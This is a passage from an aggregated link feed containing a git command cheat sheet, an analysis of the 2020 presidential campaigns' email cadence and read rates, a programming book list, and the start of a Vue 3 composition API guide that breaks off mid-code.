<p>In this article, I will list out all the git commands that I use very frequently. This is not in any way a complete list, just the commands that I use very often. This is intended to be used as a quick reference to perform an action that you want. </p>
<ul>
<li><a href="#git-clone">Clone repo</a></li>
<li><a href="#git-clone">Clone repo into specified directory</a></li>
<li><a href="#git-init">Initialize current directory as a git repo</a></li>
<li><a href="#git-add">Add a file</a></li>
<li><a href="#git-add">Add all the files in current directory</a></li>
<li><a href="#git-add">Add all the files including files in .gitignore</a></li>
<li><a href="#git-commit">Create a new commit</a></li>
<li><a href="#git-commit">Add changes to existing commit</a></li>
<li><a href="#git-status">Show status</a></li>
<li><a href="#git-status">Show status in short format</a></li>
<li><a href="#git-status">Show status in short format and show branch</a></li>
<li><a href="#git-log">Show the commit logs</a></li>
<li><a href="#git-diff">Show the diff for unstaged files</a></li>
<li><a href="#git-diff">Show the diff for staged files</a></li>
<li><a href="#git-remote">Show all the remotes with URLs</a></li>
<li><a href="#git-remote">Add a new remote</a></li>
<li><a href="#git-remote">Change URL for existing remote</a></li>
<li><a href="#git-checkout">Switch to another branch</a></li>
<li><a href="#git-checkout">Create a new branch and switch to it</a></li>
<li><a href="#git-checkout">Remove all the unstaged changes in the current directory</a></li>
<li><a href="#git-checkout">Remove all the unstaged changes for a file</a></li>
<li><a href="#git-push">Push local changes to the remote repo</a></li>
<li><a href="#git-push">Push and set the remote as upstream</a></li>
<li><a href="#git-push">Force push local changes to the remote repo</a></li>
<li><a href="#git-push">Delete the branch in the remote repo</a></li>
<li><a href="#git-branch">Delete the branch locally</a></li>
<li><a href="#git-branch">Force delete the branch locally</a></li>
<li><a href="#git-clean">Remove all untracked files and directories</a></li>
<li><a href="#git-merge">Merge the branch to the current branch</a></li>
<li><a href="#git-pull">Fetch changes from the remote and merge</a></li>
<li><a href="#git-reset">Remove all the changes to the tracked files that haven't been committed yet</a></li>
</ul>
<h3 id="git-clone">git clone</h3>
<pre><code><span># Create 'blogs' folder and clone the 'pbteja1998/blogs' repo into it</span>
git <span>clone</span> https://github.com/pbteja1998/blogs.git

<span># Create `my-blogs` folder and clone the `pbteja1998/blogs` repo into it</span>
git <span>clone</span> https://github.com/pbteja1998/blogs.git my-blogs
</code></pre>
<h3 id="git-init">git init</h3>
<pre><code><span># Initializes the current directory as a git repo</span>
git init
</code></pre>
<h3 id="git-add">git add</h3>
<pre><code><span># Adds the file contents to the index</span>
<span># Ready to be committed next time you run `git commit`</span>
<span># By default, Ignores the files present in `.gitignore`</span>

<span># Add a single file</span>
git add README.md

<span># Add all the files in the current directory</span>
git add .

<span># Also adds the files present in `.gitignore`</span>
git add -f .
</code></pre>
<h3 id="git-commit">git commit</h3>
<pre><code><span># Commits/Records the changes to the local repo</span>
git commit -m <span>"some message"</span>

<span># Does not create a new commit</span>
<span># Adds the changes to the most recent commit</span>
git commit --amend
</code></pre>
<h3 id="git-status">git status</h3>
<pre><code><span># Shows the status of the working tree</span>
git status

<span># Shows the output in short format</span>
git status -s

<span># Shows the branch even in short format</span>
git status -sb
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605245389283/23Tok2fCR.png?auto=format&amp;q=60" alt="Screenshot 2020-11-13 at 10.59.31 AM.png"></p>
<h3 id="git-log">git log</h3>
<pre><code><span># Shows the commit logs</span>
git <span>log</span>
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605244215553/QCNWhim_s.png?auto=format&amp;q=60" alt="Screenshot 2020-11-13 at 10.39.39 AM.png"></p>
<h3 id="git-diff">git diff</h3>
<pre><code><span># Shows the changes between unstaged files and the commits</span>
git diff

<span># Shows the changes between staged(ready-to-be-committed) files and the commits</span>
git diff --staged
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605244442028/73XfwnHzS.png?auto=format&amp;q=60" alt="Screenshot 2020-11-13 at 10.41.43 AM.png"></p>
<h3 id="git-remote">git remote</h3>
<pre><code><span># Shows all the remotes configured and their remote URL</span>
git remote -v

<span># Adds a remote</span>
<span># git remote add &lt;remote-name&gt; &lt;remote-url&gt;</span>
git remote add upstream https://github.com/something/blogs.git

<span># Changes the URL of the remote</span>
git remote set-url upstream https://github.com/some-thing/blogs.git
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605245169242/6n7-C9q05.png?auto=format&amp;q=60" alt="Screenshot 2020-11-13 at 10.55.54 AM.png"></p>
<h3 id="git-checkout">git checkout</h3>
<pre><code><span># Switch to branch </span>
<span># git checkout &lt;branch&gt;</span>
git checkout master

<span># Creates a new branch and switch to that</span>
git checkout -b new-feature

<span># Removes all the unstaged changes in the current directory</span>
git checkout .

<span># Removes all the unstaged changes for a file</span>
git checkout -- README.md
</code></pre>
<h3 id="git-push">git push</h3>
<pre><code><span># Pushes the local changes to the remote to keep it up-to-date</span>
git push origin master

<span># Force push the local changes to the remote</span>
<span># Usually git will not allow you to push to the remote if the remote has some commits that are not present in local repo</span>
<span># This will override that check and lets you force push to the remote</span>
<span># This may cause the remote to lose some commits. So use it carefully.</span>
git push -f origin master

<span># Push and set the remote as upstream </span>
<span># same as `git push --set-upstream origin feature-branch`</span>
git push -u origin feature-branch

<span># Deletes the branch in the remote</span>
<span># same as `git push --delete origin new-feature`</span>
git push --delete origin new-feature
</code></pre>
<h3 id="git-branch">git branch</h3>
<pre><code><span># Deletes the branch locally</span>
<span># same as `git branch --delete feature-branch`</span>
git branch -d feature-branch

<span># Force delete a branch even if it's not merged</span>
<span># same as `git branch --delete --force feature-branch`</span>
git branch -D feature-branch
</code></pre>
<h3 id="git-clean">git clean</h3>
<pre><code><span># Removes all the files and directories that are not yet tracked by git</span>
git clean -fd
</code></pre>
<h3 id="git-merge">git merge</h3>
<pre><code><span># Merges the &lt;branch&gt; to the current branch</span>
<span># git merge &lt;branch&gt;</span>
git merge feature-branch
</code></pre>
<h3 id="git-pull">git pull</h3>
<pre><code><span># Fetches the changes from the remote and merge it into local repo</span>
git pull origin master
</code></pre>
<h3 id="git-reset">git reset</h3>
<pre><code><span># Removes all the changes to the tracked files that have not yet been committed</span>
git reset --hard
</code></pre>
<h2 id="whats-next">What's Next?</h2>
<p>The next article will most probably be a part of <a target="_blank" href="https://hashnode.com/series/my-review-of-kent-c-doddss-epicreactdev-ckfv4gidh08efu9s1408v8tgp">My Review of Kent C. Dodds's EpicReact.Dev</a>. Checkout the series page for more info.</p>
<h4 id="until-next-time">Until Next Time 👋</h4>
<p>If you liked this article, check out</p>
<ul>
<li><a target="_blank" href="https://blog.bhanuteja.dev/create-your-own-super-simple-url-shortener">Create Your Own Super Simple URL Shortener</a></li>
<li><a target="_blank" href="https://blog.bhanuteja.dev/why-you-should-start-using-hsl-color-format">Why you should start using HSL color format</a></li>
<li><a target="_blank" href="https://blog.bhanuteja.dev/til-hyphenate-when-you-justify-text">Hyphenate when you justify text</a></li>
</ul>
<p>If you have any comments, please leave them below or you can also @ me on Twitter (<a target="_blank" href="https://twitter.com/pbteja1998">@pbteja1998</a>), or feel free to follow me.</p>
</div></div>]]>
            </description>
            <link>https://blog.bhanuteja.dev/30-git-commands-that-i-frequently-use</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085012</guid>
            <pubDate>Fri, 13 Nov 2020 17:41:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Trump Campaign's Unorthodox Email Tactics – Do They Work?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25085000">thread link</a>) | @roseway4
<br/>
November 13, 2020 | https://onlyinfluencers.com/email-marketing-blog-posts/best-practice-email-strategy/entry/the-trump-campaign-s-unorthodox-email-tactics-do-they-work | <a href="https://web.archive.org/web/*/https://onlyinfluencers.com/email-marketing-blog-posts/best-practice-email-strategy/entry/the-trump-campaign-s-unorthodox-email-tactics-do-they-work">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-blog-content="">

						
						
													
	<div data-eb-entry-cover="">
					<a href="https://onlyinfluencers.com/images/easyblog_articles/1035/2020-election-200.png" target="_blank" title="2020-election-200" caption="">
									<img src="https://onlyinfluencers.com/images/easyblog_articles/1035/b2ap3_small_2020-election-200.png" alt="2020-election-200">
					<meta content="https://onlyinfluencers.com/images/easyblog_articles/1035/b2ap3_small_2020-election-200.png" alt="2020-election-200">

					
							</a>
		
			</div>

							
							<!--LINK TYPE FOR ENTRY VIEW-->
							
							<p><span>The 2020 Trump reelection campaign has been anything but traditional and this has extended to their email practices as well. Political campaign email in the US is notorious for breaking general email best practices. Political email is explicitly exempted from compliance with CAN-SPAM, and so it is often a bit of Wild Wild West in regard to list acquisition and unsubscribe maintenance. Even when viewed through that lens, though, the 2020 Trump campaign is extremely unorthodox.</span><span></span></p>
<p><span>As the election started to come to a crescendo in mid-October, and possibly as a result of the Trump campaign <a href="https://www.forbes.com/sites/zengernews/2020/10/29/biden-raised-three-times-trumps-fundraising-haul-in-the-first-two-weeks-of-october/?sh=1555a3a5202b"><span>falling behind</span></a> the Biden campaign in fundraising in early October, the Trump campaign began ramping up the cadence of contact to individuals, peaking at 26 mails per day.&nbsp; That’s not a typo: the Trump campaign on the eve of the election was mailing their respondents an <strong>average of 26 times per day</strong>. Here you can see how that cadence built over the past few months, looking at traffic from joebiden.com and victory.donaldtrump.com, the primary sending domains for the two campaigns:<br></span></p>
<p><span>&nbsp;<img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_1.png" width="624" height="193" alt="George 1"></span></p>
<p><span>It’s interesting to note in the graph that while the Biden campaign mails have trailed off following election day, that the Trump emails are continuing at a high rate/fast pace as he looks to fund efforts to contest election results around the country. Indeed, while the President’s messages are increasingly getting flagged for content on Twitter and Facebook, he’s continuing to use email as a direct channel to supporters. Unlike Twitter, however, the Trump campaign’s emails are presented without <a href="https://help.twitter.com/en/using-twitter/us-elections"><span>fact-checker review</span></a> and 100% focused on raising money for the campaign - every single campaign we identified post-election has been a fundraising mail. Subject line samples post-election include:</span><strong><span></span></strong></p>
<ul>
<li><span><span> </span></span><span>VOTER FRAUD</span></li>
<li><span><span> </span></span><span>We need to HOLD the line</span></li>
<li><span><span> </span></span><span>STOP THE STEAL</span></li>
<li><span><span> </span></span><span>Can you chip in?</span></li>
<li><span><span> </span></span><span>👀</span></li>
</ul>
<p><span>(the emoji eyes subject being my personal favorite).&nbsp; Every one of these emails contains a fundraising call-to-action for the ‘Official Election Defense Fund’ (the majority of which actually </span><span><a href="https://www.washingtonpost.com/politics/trump-donations-debt/2020/11/10/024e1c80-237b-11eb-a688-5298ad5d580a_story.html"><span>goes to his leadership PAC.</span></a> Biden has not stopped his fund-raising mails post-election either, though not all of his mails are fund-raising emails, some simply thank supporters. In keeping with the characteristic tone of his campaign, Biden has been running subject lines like:</span></p>
<ul>
<li><span>[NAME], we need to re-launch the Biden Fight Fund</span></li>
<li><span><span> </span></span><span>A victory for ‘We the People’</span></li>
<li><span><span> </span></span><span>I am honored and humbled to be your President-elect</span></li>
<li><span><span> </span></span><span>Keep the faith</span></li>
</ul>
<p><span></span><span>Biden’s contact cadence has dropped to 1-2 mails per day to subscribers, while Trump’s cadence has actually increased post-election. My colleague <a href="https://www.edatasource.com/author/john-landsman/"><span>John Landsman</span></a> observed: “<span>In fifteen years of working with email analytics, I've never seen a brand or candidate with anything like an hourly contact frequency per subscriber.”</span></span></p>
<p><span></span><span>Trump has seemingly taken his rapid-fire Twitter strategy now to email. Perhaps he’s doing this to creatively work around the warnings on his Twitter messages given email’s semi-independence from walled gardens. The question is, is this technique effective? Ultimately, we will see how that plays out in the campaign finance numbers, but we can get a leading view by looking at the inboxing and read rates on these emails.</span></p>
<p><span>First off, the inboxing statistics for both campaigns look fine, with the Trump campaign’s emails inboxing very reliably. During the 2016 campaign Trump had a real problem with </span><a href="https://www.yahoo.com/entertainment/donald-trump-email-spam-problem-212632215.html"><span>spam filters</span></a><span>, which resulted in significant blocking issues. In the runup to the 2020 election problem, this seems to have been significantly improved. You can see in the chart below that Trump’s inboxing has been ‘fine’ (especially given its volume) and has performed ahead of Biden’s mails every day in the observed period.</span></p>
<p><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_2.png" width="624" height="197" alt="George 2"></p>
<p><span>But are people reading them? Interestingly, the cadence the Trump campaign has adopted hasn’t seemed to affect this, with the read rate hovering around 10%, contrasted with around 20% for the Biden mails. Both of these results are within a normal range for political parties and candidates as a category this campaign season, with Biden’s performance being close to the top quartile and Trump’s just inside the bottom quartile for read rates.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_3.png" alt="George 3"></span></p>
<p><span>With the campaign’s basically identical call-to-action (“donate now!”) across a large number of touchpoints per day, the read rate on individual emails matters less than the gross number of mails a given recipient opens daily. Meaning that since the outcome that all of these 26-daily mails is the same, it’s a mistake to focus on them as individual campaigns and look at their individual read rates. Instead it’s better to look at the entire barrage as a campaign and judge the success based on whether or not any shot in it ‘hits’.</span><br><span></span></p>
<p><span>Prior to October, the two different approaches of the campaigns resulted in basically the same number of emails read by an end-user on a given day. But as the Trump campaign’s cadence rose, these numbers diverged significantly. Based on open data, the average Biden campaign subscriber is now actually reading an email every other day; the average Trump campaign subscriber continues to read multiple emails per day.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_4.png" alt="George 4"></span></p>
<p><span>Trump is also mailing a larger portion of his overall list on any given day, though those lists are slightly shrinking as the daily cadence has gone up.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_5.png" alt="George 5"></span></p>
<p><span>It would be interesting to see what the effect of this high cadence has been on unsubscribes, but it’s important to remember that in the US political mails are not bound by CAN-SPAM and political entities can mail whomever they want how often they want, without legal concerns around maintaining subscription information and handling unsubscribes. A notable difference between the Biden and Trump campaigns is that Biden, in accordance with emailing best practices, includes links to manage your subscription. In contrast, the Trump emails provide no mechanism for recipients to unsubscribe. This is perfectly legal under CAN-SPAM since these are political emails, but it’s a poor practice and I certainly wouldn’t recommend anyone try it at home.</span></p>
<p><span>We can see this difference if we look at inferred unsubscribe rates between the two campaigns.&nbsp; We can’t measure the actual unsubscribe data, but what we can look at is how many recipients stop getting emailed after a given send.&nbsp;</span></p>
<p><span>When we look at that, we see a very low unsubscribe rate for the Trump campaign emails, especially compared to the Biden emails, but this is almost certainly highly affected by the lack of an unsubscribe method in the Trump mails.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_6.png" alt="George 6"></span></p>
<p><span>Trump’s email strategy has been both effective and unorthodox, but it’s likely to cause subscriber burnout in the long run as well as blocking issues if it continues. It also seems likely to be a strategy that will not work beyond his most devoted base - how many people would opt to receive emails at this cadence and for how long?</span></p>
<p><span>Trump’s strategy of increasing frequency so far has worked when it comes to total emails read, but like with all marketing mail, it’s really the downstream conversion (in this case donations) that will measure the ultimate success and time will tell how that has worked. If you are a contrarian, you might be speculating that this increased cadence isn’t a sign of email abuse, but that instead Trump really knows his audience’s appetite for hearing from him and will eat up this strategy. Donations to the legal fund will tell us in the end.</span></p>
<p><span>Either way, Trump and Biden both continue to do major fundraising pushes post-election as they look to fund the expensive work of contesting (and defending) the 2020 election. If you happen to subscribe to either of the campaigns’ emails, I think you will continue to have a full inbox for some time.</span></p>						
						
											</div></div>]]>
            </description>
            <link>https://onlyinfluencers.com/email-marketing-blog-posts/best-practice-email-strategy/entry/the-trump-campaign-s-unorthodox-email-tactics-do-they-work</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085000</guid>
            <pubDate>Fri, 13 Nov 2020 17:39:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Books for Programmers in 2020]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25084929">thread link</a>) | @nickyvanurk
<br/>
November 13, 2020 | https://codingwizardry.com/2020/11/13/10-best-books-for-programmers-in-2020/ | <a href="https://web.archive.org/web/*/https://codingwizardry.com/2020/11/13/10-best-books-for-programmers-in-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="penci-post-entry-inner">
			
<p>Most programmers I know started programming out of sheer curiosity and joy. Joy is what keeps one motivated to keep up with the changing landscape of technology. It’s what keeps one happy. That is why I am recommending these 10 best books for programmers, books I really enjoyed reading. These are the books that I keep picking up and coming back to or have fond memories of. These are also the books that I hardly see recommended elsewhere, except for a few classics that are certainly worth repeating. And now I would like to share these books with you.</p>



<p><em>This post contains affiliate links where applicable. If you’re planning to buy any of these books yourself you can support this blog by buying it with the links</em> provided in the titles.</p>



<div><div>
<h2><a href="https://amzn.to/36ALozx" target="_blank" rel="noreferrer noopener nofollow">The Pragmatic Programmer<br></a><sub>Your Journey to Mastery, 20th Anniversary Edition</sub></h2>



<div><figure><img loading="lazy" width="230" height="300" src="https://codingwizardry.com/wp-content/uploads/2020/11/the-pragmatic-programmer-230x300.jpg" alt=""></figure></div>



<p>I would recommend any programmer to read this book. It contains a lot of wisdom, tips, and advice. Most of it is pretty basic but therein lies the beauty. The first edition released in 1999 and was getting pretty dated. Despite it being old it was still highly recommended. To my surprise they released a new edition 20 years later, all up-to-date! Now you’ve got no excuses left to not read this book. A wonderful book that you surely will be referring back to over and over again, I know I do.</p>




</div></div>



<div><div>
<h2><a href="https://www.learninpublic.org/" target="_blank" rel="noreferrer noopener nofollow">The Coding Career Handbook<br></a><sub>Guides, Principles, Strategies, and Tactics – from Code Newbie to Senior Dev</sub></h2>



<div><figure><img src="https://codingwizardry.com/wp-content/uploads/2020/11/the-coding-career-handbook-196x300.jpg" alt="" width="200" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/the-coding-career-handbook-196x300.jpg 196w, https://codingwizardry.com/wp-content/uploads/2020/11/the-coding-career-handbook.jpg 311w" sizes="(max-width: 196px) 100vw, 196px"></figure></div>



<p>Similar to the The Pragmatic Programmer , I consider this book a must-read. It focuses on the bigger picture and your career, not just about writing code. This book is the reason I started this blog in the first place! A great book for any ambitious programmer and want to take your career to the next level.</p>




</div></div>



<div><div>
<h2><a href="https://amzn.to/36ulPQI">Apprenticeship Patterns<br></a><sub>Guidance for the Aspiring Software Craftsman</sub></h2>



<div><figure><img loading="lazy" width="229" height="300" src="https://codingwizardry.com/wp-content/uploads/2020/11/apprenticeship-patterns-229x300.jpeg" alt="" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/apprenticeship-patterns-229x300.jpeg 229w, https://codingwizardry.com/wp-content/uploads/2020/11/apprenticeship-patterns.jpeg 260w" sizes="(max-width: 229px) 100vw, 229px"></figure></div>



<p>If you’re new to programming, making the same mistakes as the programmers that have gone before you can be costly and detrimental for your career. Let this book guide you on avoiding these same mistakes. This book is similar to the ones mentioned above and makes for a nice addition. It’s split up into smaller sections that can be read in any order you’d like, this makes it a fun and easy read.</p>




</div></div>



<div><div>
<h2><a href="https://amzn.to/3prQVAU">Beginning C++ Through Game Programming</a></h2>



<div><figure><img loading="lazy" width="243" height="300" src="https://codingwizardry.com/wp-content/uploads/2020/11/beginning-c-through-game-programming-243x300.jpg" alt="" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/beginning-c-through-game-programming-243x300.jpg 243w, https://codingwizardry.com/wp-content/uploads/2020/11/beginning-c-through-game-programming.jpg 405w" sizes="(max-width: 243px) 100vw, 243px"></figure></div>



<p>This is the book that taught me how code and was the first book I read on the subject of programming. It made learning new programming languages that much easier. Ever since I read this book it seems I’ve always been one step ahead of the herd. This book is about learning the fundamentals of programming and C++ and less about games. It merely uses games as an example to reinforce programming concepts. This book was a lot of fun to read and because it uses games as a theme it keeps one motivated.</p>




</div></div>



<div><div>
<h2><a href="https://amzn.to/35sQDSE" target="_blank" rel="noreferrer noopener nofollow">Programming Game AI by Example</a></h2>



<div><figure><img loading="lazy" width="201" height="300" src="https://codingwizardry.com/wp-content/uploads/2020/11/programming-game-ai-by-example-201x300.jpg" alt="" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/programming-game-ai-by-example-201x300.jpg 201w, https://codingwizardry.com/wp-content/uploads/2020/11/programming-game-ai-by-example.jpg 335w" sizes="(max-width: 201px) 100vw, 201px"></figure></div>



<p>To be honest I have not read this book in it’s entirety yet as I currently lack the time to do so. But I am really excited about this one and can’t wait to read it in combination with learning a new programming language: Rust. This book makes use of C++ but I’d figure these languages are similar enough as to implement the same ideas in Rust. I’ve put this book on this list because of the pure excitement it makes me feel. I would recommend to at least peruse this book to see if it resonates with you.</p>




</div></div>



<div><div>
<h2><a href="https://amzn.to/3nrDlfj" target="_blank" rel="noreferrer noopener nofollow">The Phoenix Project<br></a><sub>A Novel about IT, Devops, and Helping Your Business Win</sub></h2>



<div><figure><img loading="lazy" width="201" height="300" src="https://codingwizardry.com/wp-content/uploads/2020/11/the-phoenix-project-201x300.jpg" alt="" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/the-phoenix-project-201x300.jpg 201w, https://codingwizardry.com/wp-content/uploads/2020/11/the-phoenix-project.jpg 334w" sizes="(max-width: 201px) 100vw, 201px"></figure></div>



<p>This is a book I got recommended, I read it, I loved it. I recommended it to a friend, and he loved it. And now I recommend it to you! It’s a really fun read and I could hardly put it down. This book really is written like a novel and packed with great lessons. Go read it! There is also a part two of sorts: The Unicorn Project. I hear it contains much of the same lessons, only told with a different story. I have yet to read it but will certainly do so in the near future.</p>




</div></div>



<div><div>
<h2><a href="https://amzn.to/3ktXAae" target="_blank" rel="noreferrer noopener nofollow">Designing Data-Intensive Applications<br></a><sub>The Big Ideas Behind Reliable, Scalable, and Maintainable Systems</sub></h2>



<div><figure><img loading="lazy" src="https://codingwizardry.com/wp-content/uploads/2020/11/designing-data-intensive-applications-229x300.jpg" alt="" width="229" height="300" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/designing-data-intensive-applications-229x300.jpg 229w, https://codingwizardry.com/wp-content/uploads/2020/11/designing-data-intensive-applications.jpg 381w" sizes="(max-width: 229px) 100vw, 229px"></figure></div>



<p>So you’ve learned how to code and now can write decent software. It’s time to focus on the bigger picture and learn about systems architecture and scaling, where do you start? This book is the answer. It will teach you all about designing data-intensive applications and serves as a great resource to prep for your systems design interviews.</p>




</div></div>



<div><div>
<h2><a href="https://amzn.to/2UqPpRg" target="_blank" rel="noreferrer noopener nofollow">Game Programming Patterns</a></h2>



<div><figure><img loading="lazy" width="244" height="300" src="https://codingwizardry.com/wp-content/uploads/2020/11/game-programming-patterns-244x300.jpg" alt="" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/game-programming-patterns-244x300.jpg 244w, https://codingwizardry.com/wp-content/uploads/2020/11/game-programming-patterns.jpg 406w" sizes="(max-width: 244px) 100vw, 244px"></figure></div>



<p>I adore this book. It’s a book I keep coming back to over and over. It’s about programming patterns with a game theme once again. Note that the patterns here are not only for games! Some of them are game specific but most of them aren’t. It’s a fun read with beautiful hand drawn diagrams. Bob Nystrom clearly has put a lot of love in his book. You can read the web version for free <a href="https://gameprogrammingpatterns.com/contents.html" target="_blank" rel="noreferrer noopener nofollow">here</a>!</p>




</div></div>



<div><div>
<h2><a href="https://amzn.to/35s2hgo" target="_blank" rel="noreferrer noopener nofollow">The Web Application Hacker’s Handbook<br></a><sub>Finding and Exploiting Security Flaws</sub></h2>



<div><figure><img loading="lazy" width="241" height="300" src="https://codingwizardry.com/wp-content/uploads/2020/11/the-web-application-hackers-handbook-241x300.jpg" alt="" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/the-web-application-hackers-handbook-241x300.jpg 241w, https://codingwizardry.com/wp-content/uploads/2020/11/the-web-application-hackers-handbook.jpg 402w" sizes="(max-width: 241px) 100vw, 241px"></figure></div>



<p>You’re a back-end developer and are responsible for fending of hackers? This is the book for you. It will arm you with the knowledge of how hackers actually hack your web applications and what you can do about it! And if you ever want to make a career switch to become a <a href="https://en.wikipedia.org/wiki/Bug_bounty_program" target="_blank" rel="noreferrer noopener nofollow">Bug Bounty Hunter</a>, this is the #1 book recommendation within that field.</p>




</div></div>



<div><div>
<h2><a href="https://amzn.to/3ly5xfO" target="_blank" rel="noreferrer noopener nofollow">Cracking the Coding Interview<br></a><sub>189 Programming Questions and Solutions</sub></h2>



<div><figure><img loading="lazy" width="211" height="300" src="https://codingwizardry.com/wp-content/uploads/2020/11/cracking-the-coding-interview-211x300.jpeg" alt="" srcset="https://codingwizardry.com/wp-content/uploads/2020/11/cracking-the-coding-interview-211x300.jpeg 211w, https://codingwizardry.com/wp-content/uploads/2020/11/cracking-the-coding-interview.jpeg 243w" sizes="(max-width: 211px) 100vw, 211px"></figure></div>



<p>A classic for coding interview prep. I’ve read this book after seeing it recommended everywhere and I must say I’m glad I did. It teaches you all about data-structures and has a ton of example coding interview questions and their answers. This is a must-read for any programmer.</p>




</div></div>
			
			
			
					</div>
	</div></div>]]>
            </description>
            <link>https://codingwizardry.com/2020/11/13/10-best-books-for-programmers-in-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084929</guid>
            <pubDate>Fri, 13 Nov 2020 17:34:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use TypeScript in Vue 3]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25084928">thread link</a>) | @webdevetc
<br/>
November 13, 2020 | https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3 | <a href="https://web.archive.org/web/*/https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-area"><p><a href="https://github.com/vuejs/vue-next/releases/tag/v3.0.0" target="_blank" rel="noopener">Vue 3.0</a> was (finally!) released a little while ago. It is <em>mostly</em> compatible with the old Vue 2 way of doing things... but lots have changed and there are many new ways of doing things. </p>
<p><strong>This is a guide to setting things up in Vue 3 using the Vue 3 composition API, and instructions for adding packages such as Vuex, Vue Router, Vue Test Utils and setting up Typescript support with Vue 3</strong>. It is intended for readers who are already familiar with Vue 2 but are looking for a tutorial/guide to move their codebase to use Vue 3.</p>
<p>I've created a <a href="https://webdevetc-vue3-example-starter.netlify.app/" target="_blank" rel="noopener">sample app</a>, along with <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">the Vue 3 app source code on Github</a>. </p>
<p>The app is quite basic and is meant just for demonstration purposes. I find tutorials and guides much easier to see when they have a bigger application to refer to, rather than just short snippets.</p>
<h2 id="a-quick-guide-to-vue-3s-composition-api">A quick guide to Vue 3's composition API</h2>
<p>There are tons of guides on Vue 3's composition API. I am really excited to start using it in some projects (although I still have some reservations about how useful it will be - but I felt the same about React hooks, and the have really picked up in popularity)</p>
<p>In Vue 2 (and also in Vue 3 as you can still use the <strong>options API</strong>) you would probably be used to seeing things like this:</p>
<pre><code><span> </span><span>// ...</span>
<span> </span><span>export</span><span> </span><span>default</span><span> </span><span>{</span>
<span> </span><span>data</span><span>()</span><span> </span><span>{</span>
<span>   </span><span>return</span><span> </span><span>{</span>
<span>     postTitle</span><span>:</span><span> </span><span>'</span><span>a default title</span><span>'</span><span>,</span><span>    </span>
<span>   </span><span>}</span>
<span> </span><span>},</span>
<span> methods</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>updateTitle</span><span>(</span><span>newValue</span><span>)</span><span> </span><span>{</span>
<span>        </span><span>this</span><span>.</span><span>postTitle</span><span> </span><span>=</span><span> </span><span>newValue</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>},</span>
<span> computed</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>numWordsInTitle</span><span>()</span><span> </span><span>{</span>
<span>        </span><span>return</span><span> </span><span>this</span><span>.</span><span>postTitle</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>)</span><span>.</span><span>length</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>}</span>
<span>}</span></code></pre>
<p>And then in your <code>&lt;template&gt;</code> you could reference those data/methods/computed properties:</p>
<pre><code><span>&lt;</span><span>template</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>h1</span><span>&gt;{{</span><span> </span><span>postTitle</span><span> </span><span>}}&lt;/</span><span>h1</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Post has </span><span>{{</span><span> </span><span>numWordsInTitle</span><span> </span><span>}}</span><span> words</span><span>&lt;/</span><span>p</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>button</span><span> </span><span>@click</span><span>=</span><span>"</span><span>updateTitle</span><span>(</span><span>'</span><span>something new</span><span>'</span><span>)</span><span>"</span><span>&gt;</span><span>Update to 'something new'</span><span>&lt;/</span><span>button</span><span>&gt;</span>
<span>&lt;/</span><span>template</span><span>&gt;</span></code></pre>
<p><strong>To convert from that 'old' Vue 2 options API to using the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">Vue 3 composition API</a></strong>, you would instead do the following:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>defineComponent</span><span>,</span><span> </span><span>ref</span><span>,</span><span> </span><span>computed</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>

<span>export</span><span> </span><span>default</span><span> </span><span>defineComponent</span><span>(</span><span>{</span>
<span>  name</span><span>:</span><span> </span><span>'</span><span>BlogSummary</span><span>'</span><span>,</span>
<span>  components</span><span>:</span><span> </span><span>{},</span>
<span>  props</span><span>:</span><span> </span><span>{</span>
<span>    post</span><span>:</span><span> </span><span>Object</span><span>,</span>
